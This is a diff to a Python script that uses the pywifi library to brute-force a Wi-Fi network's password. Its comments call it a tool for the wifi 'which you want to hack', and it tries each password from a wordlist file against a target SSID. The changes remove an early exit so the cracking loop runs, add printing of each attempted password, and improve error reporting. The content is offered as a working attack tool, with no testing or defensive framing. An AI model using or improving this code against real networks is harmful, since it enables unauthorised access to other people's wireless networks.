@@ -19,10 +19,18 @@ from pywifi import Profile
 # cient_ssid == name of the wifi which you want to hack
 # path to already created brute force password file
 
-client_ssid = "Dfone"
-path_to_file = "wifi-passwords.txt"
+# client_ssid = "Dfone"
+# path_to_file = "data/wifi-passwords.txt"
+# path_to_file = "data/passwords.txt"
 
 #######
+import logging
+logging.basicConfig(
+    level=logging.NOTSET,
+    force=True,
+    format="",
+    stream=sys.stdout
+)
 
 
 # Setting the color combinations
@@ -42,16 +50,20 @@ try:
     ifaces.scan()  # check the card
     results = ifaces.scan_results()  # Obtain the results of the previous triggerred scan. A Profile list will be returned.
 
+    print(f"{results=}")
+
     wifi = pywifi.PyWiFi()  # A Profile is the settings of the AP we want to connect to
     iface = wifi.interfaces()[0]
 
+    # exit(0)
     print("[+] ok")
-except:
+except Exception as e:
     print("[-] Error system")
+    print(repr(e))
     exit()
 
 type = False
-exit()
+# exit()
 
 def main(ssid, password, number):
     profile = Profile()  # create profile instance
@@ -85,6 +97,7 @@ def pwd(ssid, file):
             number += 1
             line = line.split("\n")
             pwd = line[0]
+            print(RESET, f"[{number}] Trying {ssid} with {pwd}")
             main(ssid, pwd, number)
 
 
@@ -114,10 +127,11 @@ def menu(client_ssid, path_to_file):
 
         # breaking
     if os.path.exists(filee):
-        if platform.system().startswith("Win" or "win"):
-            os.system("cls")
-        else:
-            os.system("clear")
+        pass
+    #     if platform.system().startswith("Win" or "win"):
+    #         os.system("cls")
+    #     else:
+    #         os.system("clear")
 
         print(BLUE, "[~] Cracking...")
         pwd(ssid, filee)
@@ -127,7 +141,7 @@ def menu(client_ssid, path_to_file):
 
 
 # Main function call
-menu(client_ssid, path_to_file)
+menu(client_ssid="", path_to_file="")
 
 ###########################################################################################################################################################
 # END OF FILE
